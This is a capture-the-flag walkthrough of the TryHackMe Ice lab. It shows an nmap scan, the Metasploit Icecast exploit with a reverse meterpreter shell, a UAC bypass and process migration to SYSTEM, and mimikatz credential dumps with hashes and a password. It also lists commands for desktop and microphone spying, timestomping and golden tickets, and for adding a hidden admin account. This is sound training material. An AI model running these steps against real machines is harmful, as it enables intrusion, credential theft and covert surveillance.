# TryHackMe-ICE CTF

> Abdullah Rizwan | 09 September ,09 : 05 PM

## NMAP

```
export IP=10.10.215.129

```

It is a good practice to scan all ports so we are going to use this syntax
```
nmap -T4 -A -p- $IP

```


```
Host is up (0.17s latency).                                                                                                                         
Not shown: 65523 closed ports                                                                                                                       
PORT      STATE SERVICE            VERSION                                                                                                          
135/tcp   open  msrpc              Microsoft Windows RPC                                                                                            
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn                                                                                    
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)                                   
3389/tcp  open  ssl/ms-wbt-server?                                                                                                                  
|_ssl-date: 2020-09-09T16:59:43+00:00; -8h59m59s from scanner time.                                                                                 
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                          
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                         
|_http-title: Service Unavailable                                                                                                                   
8000/tcp  open  http               Icecast streaming media server                                                                                   
|_http-title: Site doesn't have a title (text/html).                                                                                                
49152/tcp open  msrpc              Microsoft Windows RPC                                                                                            
49153/tcp open  msrpc              Microsoft Windows RPC                                                                                            
49154/tcp open  msrpc              Microsoft Windows RPC                                                                                            
49158/tcp open  msrpc              Microsoft Windows RPC                                                                                            
49159/tcp open  msrpc              Microsoft Windows RPC                                                                                            
49161/tcp open  msrpc              Microsoft Windows RPC                                                                                            
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).                                                 
TCP/IP fingerprint:                                                                                                                                 
OS:SCAN(V=7.80%E=4%D=9/9%OT=135%CT=1%CU=32788%PV=Y%DS=2%DC=T%G=Y%TM=5F5988C                                                                         
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=104%TI=I%CI=I%II=I%SS=S%TS=                                                                         
OS:7)OPS(O1=M508NW8ST11%O2=M508NW8ST11%O3=M508NW8NNT11%O4=M508NW8ST11%O5=M5                                                                         
OS:08NW8ST11%O6=M508ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200                                                                         
OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M508NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S                                                                         
OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%                                                                         
OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=                                                                         
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=80%CD=Z)

Network Distance: 2 hops

Host script results:
|_clock-skew: mean: -7h44m58s, deviation: 2h30m00s, median: -8h59m59s
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:a7:8e:88:a9:05 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-09-09T11:59:35-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-09T16:59:35
|_  start_date: 2020-09-09T16:11:28

TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   177.21 ms 10.8.0.1
2   180.01 ms 10.10.215.129

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 931.07 seconds


```

## Metaslpoit

Now we can look for `icecast` in msfconsole and there is a vulnerability for icecast

https://www.cvedetails.com/cve/CVE-2004-1561/

```
 search icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite

```


Use this exploit and change settings according to your `tun0` and `machine_ip`.
```
Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.215.129    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.8.94.60       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



```


```
exploit

[*] Started reverse TCP handler on 10.8.94.60:4444 
[*] Sending stage (176195 bytes) to 10.10.215.129
[*] Meterpreter session 1 opened (10.8.94.60:4444 -> 10.10.215.129:49264) at 2020-09-09 22:18:29 -0400

meterpreter > 


```

```
getuid
Server username: Dark-PC\Dark
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

```
## Privilege Escalation

Since we are not the administrator of this box we can run build module to look for privilege escalation

```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.215.129 - Collecting local exploits for x86/windows...
[*] 10.10.215.129 - 34 exploit checks are being tried...
[+] 10.10.215.129 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.215.129 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.215.129 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.215.129 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.215.129 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.215.129 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.215.129 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.215.129 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.215.129 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
meterpreter > 


```

Now selecting the first exploit found we are going to background `ctrl+z` our session.
```
msf5 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr                                                            
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/local/bypassuac_eventvwr) > show options

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.6      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf5 exploit(windows/local/bypassuac_eventvwr) > set SESSION 1
SESSION => 1
msf5 exploit(windows/local/bypassuac_eventvwr) > set LHOST 10.8.94.60
LHOST => 10.8.94.60
msf5 exploit(windows/local/bypassuac_eventvwr) > 


```

When we run this exploit we will have another session created

```
exploit

[*] Started reverse TCP handler on 10.8.94.60:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (176195 bytes) to 10.10.215.129
[*] Meterpreter session 2 opened (10.8.94.60:4444 -> 10.10.215.129:49278) at 2020-09-09 22:30:01 -0400
```

Now we have to see which process is running as `authoritiy`


```
 PID   PPID  Name                  Arch  Session  User                          Path                                                       [48/1936]
 ---   ----  ----                  ----  -------  ----                          ----                                 
 0     0     [System Process]                                                                                        
 4     0     System                x64   0                                                                               
 384   3124  powershell.exe        x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe    
 500   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe 
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe  
 552   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 588   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 652   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 812   692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1060  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1188  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1296  500   dwm.exe               x64   1        Dark-PC\Dark                  C:\Windows\System32\dwm.exe
 1316  1288  explorer.exe          x64   1        Dark-PC\Dark                  C:\Windows\explorer.exe
 1392  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1420  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1476  692   taskhost.exe          x64   1        Dark-PC\Dark                  C:\Windows\System32\taskhost.exe
 1596  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1668  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1708  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1900  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1984  1316  Icecast2.exe          x86   1        Dark-PC\Dark                  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 2132  816   slui.exe              x64   1        Dark-PC\Dark                  C:\Windows\System32\slui.exe
 2244  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 2268  816   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 2512  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
 2572  1984  cmd.exe               x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\cmd.exe
 2676  816   rundll32.exe          x64   1        Dark-PC\Dark                  C:\Windows\System32\rundll32.exe
 2724  2676  dinotify.exe          x64   1        Dark-PC\Dark                  C:\Windows\System32\dinotify.exe
 3680  604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
 3728  604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe


```


Here `spoolsv.exe` is ruuning as authority and we can take advantage of that by `migrating` into that process.



```
migrate -N spoolsv.exe
[*] Migrating from 384 to 1392...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 

```



## Kiwi

```
meterpreter > load kiwi                                                                                                                             
Loading extension kiwi...                                                                                                                           
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)                         
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                                                                         
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                                                            
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz                    
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )                                                                           
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/ 
                                                                                                                                                    
Success.                                                       


Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed) 
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)


```

Now using `creds_all` to retreive the password in parsed form

```
eterpreter > creds_all    
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)

```

 	

While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?

```
screenshare
```

How about if we wanted to record from a microphone attached to the system?

```
record mic
```


To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.

```
timestomp
```

 	

Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?

Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.


```
golden_ticket_create
```
# Extra

## RDP

If you want to remotely connect to the box and use it's GUI you can do that by checking if `rdp` is enabled on that box


```
meterpreter > run post/windows/manage/enable_rdp                          
                                     
[*] Enabling Remote Desktop                                               
[*]     RDP is already enabled       
[*] Setting Terminal Services service startup mode                        
[*]     The Terminal Services service is not set to auto, changing it to auto ...                                   
[*]     Opening port in local firewall if necessary                                                                                                 
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20200909230409_default_10.10.215.129_host.windows.cle_189827.txt

```

If you want you can add a new user as long as your `Authority`

```
terpreter > run getgui -u arz -p Password01!                                                             

[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
[!] Example: run post/windows/manage/enable_rdp OPTION=value [...]        
[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
[*] Carlos Perez carlos_perez@darkoperator.com                            
[*] Setting user account for logon                                        
[*]     Adding User: arz with Password: Password01!                       
[*]     Hiding user from Windows Login screen                             
[*]     Adding User: arz to local group 'Remote Desktop Users'            
[*]     Adding User: arz to local group 'Administrators'                  
[*] You can now login with the created user                               
[*] For cleanup use command: run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20200909.1126.rc

```
Since `Dark` is logged in for now this would mess up the box if we try to login with a new user.

```
root@kali:~# rdesktop -u dark -p Password01! 10.10.215.129                                                                                          
Autoselecting keyboard map 'en-us' from locale                                                                                                      
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.                                                                                                                                              
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?                                                                            
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.                                                                                                                                              
Connection established using SSL.                                                                                                                   
Protocol(warning): process_pdu_logon(), Unhandled login infotype 1                                                                                  
Clipboard(error): xclip_handle_SelectionNotify(), unable to find a textual target to satisfy RDP clipboard text request                             
                                                                                                                                     
```

<a href="https://imgur.com/7Dw4QmA"><img src="https://i.imgur.com/7Dw4QmA.png" title="source: imgur.com" /></a>
	